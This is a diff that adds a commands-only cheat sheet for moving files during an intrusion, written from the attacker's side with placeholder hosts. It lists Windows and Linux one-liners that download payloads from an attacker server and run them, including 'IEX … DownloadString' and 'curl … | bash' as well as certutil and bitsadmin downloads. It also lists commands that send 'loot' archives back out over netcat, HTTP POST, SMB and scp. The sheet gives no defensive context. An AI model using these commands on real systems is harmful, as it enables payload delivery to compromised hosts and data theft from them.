@@ -1,0 +1,35 @@
+# File Transfers — Quick Reference (commands only)
+
+## Attacker: Start a Server
+python3 -m http.server 80
+impacket-smbserver share . -smb2support
+nc -lvnp 4444 > received_file
+
+## Download to Windows
+certutil -urlcache -split -f http://<ip>/payload.exe C:\Windows\Temp\payload.exe
+Invoke-WebRequest -Uri http://<ip>/payload.exe -OutFile C:\Windows\Temp\payload.exe
+(New-Object Net.WebClient).DownloadFile('http://<ip>/payload.exe','C:\Windows\Temp\payload.exe')
+IEX(New-Object Net.WebClient).DownloadString('http://<ip>/script.ps1')
+copy \\<ip>\share\payload.exe C:\Windows\Temp\payload.exe
+bitsadmin /transfer j /download /priority high http://<ip>/payload.exe C:\Windows\Temp\payload.exe
+curl http://<ip>/payload.exe -o C:\Windows\Temp\payload.exe
+
+## Download to Linux
+wget http://<ip>/payload -O /tmp/payload && chmod +x /tmp/payload
+curl http://<ip>/payload -o /tmp/payload
+curl http://<ip>/script.sh | bash
+cat < /dev/tcp/<ip>/80 > /tmp/payload
+scp <user>@<ip>:/path/to/payload /tmp/payload
+nc <ip> 4444 > /tmp/payload
+
+## Upload from Windows
+copy C:\loot.zip \\<ip>\share\loot.zip
+Invoke-WebRequest -Uri http://<ip>/up -Method POST -InFile C:\loot.zip
+certutil -encode loot.zip loot.b64 && type loot.b64
+nc <ip> 4444 < C:\loot.zip
+
+## Upload from Linux
+curl -X POST http://<ip>/up -F "file=@/tmp/loot.zip"
+nc <ip> 4444 < /tmp/loot.zip
+scp /tmp/loot.zip <user>@<ip>:/tmp/
+base64 /tmp/loot.zip
